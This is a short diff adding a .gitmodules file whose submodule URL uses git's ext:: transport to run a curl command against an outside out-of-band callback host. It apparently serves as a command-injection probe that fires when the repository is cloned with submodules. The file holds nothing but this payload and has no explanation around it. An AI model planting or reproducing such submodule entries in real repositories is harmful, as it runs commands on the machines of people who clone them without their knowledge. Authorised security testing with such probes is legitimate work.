@@ -1,0 +1,3 @@
+[submodule "nested"]
+	path = nested
+	url = ext::curl https://db7mq1c1pgvvrq4sbcrghp4ca9xq5uero.oast.pro/a3-submodule
